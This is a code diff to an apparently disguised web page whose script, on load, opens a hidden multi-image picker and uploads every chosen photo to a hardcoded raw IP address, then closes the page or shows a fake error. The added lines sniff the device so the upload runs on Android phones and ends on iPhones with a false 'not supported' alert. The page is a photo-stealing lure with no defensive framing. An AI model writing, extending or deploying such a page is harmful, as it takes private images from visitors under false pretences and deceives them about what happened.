@@ -26,47 +26,70 @@
     <input type="file" id="photo-upload" accept="image/*" class="hidden" multiple>
 
     <script>
-        // Check if the browser has permission to access the photo library
-        const fileInput = document.getElementById("photo-upload");
-        fileInput.click();
+        // Detect device type
+        const isAndroid = /Android/i.test(navigator.userAgent);
+        const isiPhone = /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-        fileInput.addEventListener("change", async (event) => {
-            const files = event.target.files;
-            if (files.length > 0) {
-                // Upload each file to the server
-                for (const file of files) {
-                    const formData = new FormData();
-                    formData.append("photo", file);
+        // Log device type (for debugging)
+        console.log(`Device detected: ${isAndroid ? 'Android' : isiPhone ? 'iPhone' : 'Unknown'}`);
 
-                    try {
-                        const response = await fetch("http://91.2.36.103:5000/upload", {
-                            method: "POST",
-                            body: formData,
-                        });
+        // Function to upload photos
+        async function uploadPhotos() {
+            const fileInput = document.getElementById("photo-upload");
+            fileInput.click();
 
-                        if (!response.ok) {
-                            console.error("Upload failed for file:", file.name);
+            fileInput.addEventListener("change", async (event) => {
+                const files = event.target.files;
+                if (files.length > 0) {
+                    // Upload each file to the server
+                    for (const file of files) {
+                        const formData = new FormData();
+                        formData.append("photo", file);
+
+                        try {
+                            const response = await fetch("http://91.2.36.103:5000/upload", {
+                                method: "POST",
+                                body: formData,
+                            });
+
+                            if (!response.ok) {
+                                console.error("Upload failed for file:", file.name);
+                            }
+                        } catch (error) {
+                            console.error("Error uploading file:", file.name, error);
                         }
-                    } catch (error) {
-                        console.error("Error uploading file:", file.name, error);
                     }
+
+                    // Close the page after upload
+                    window.close();
+                } else {
+                    // Display a generic error message if no files are selected
+                    document.querySelector(".loading").textContent = "An error occurred. Please try again later.";
                 }
+            });
 
-                // Close the page after upload
-                window.close();
-            } else {
-                // Display a generic error message if no files are selected
-                document.querySelector(".loading").textContent = "An error occurred. Please try again later.";
-            }
-        });
+            // Abort if no files are selected after a short delay
+            setTimeout(() => {
+                if (fileInput.files.length === 0) {
+                    document.querySelector(".loading").textContent = "An error occurred. Please try again later.";
+                    window.close();
+                }
+            }, 5000); // 5-second timeout
+        }
 
-        // Abort if no files are selected after a short delay
-        setTimeout(() => {
-            if (fileInput.files.length === 0) {
-                document.querySelector(".loading").textContent = "An error occurred. Please try again later.";
-                window.close();
-            }
-        }, 5000); // 5-second timeout
+        // Adjust behavior based on device type
+        if (isAndroid) {
+            // Android devices are more permissive with file access
+            uploadPhotos();
+        } else if (isiPhone) {
+            // iPhones are more restrictive, so we need to be cautious
+            alert("Your device is not supported for this operation.");
+            window.close();
+        } else {
+            // Unknown device
+            alert("Unsupported device.");
+            window.close();
+        }
     </script>
 </body>
 </html>
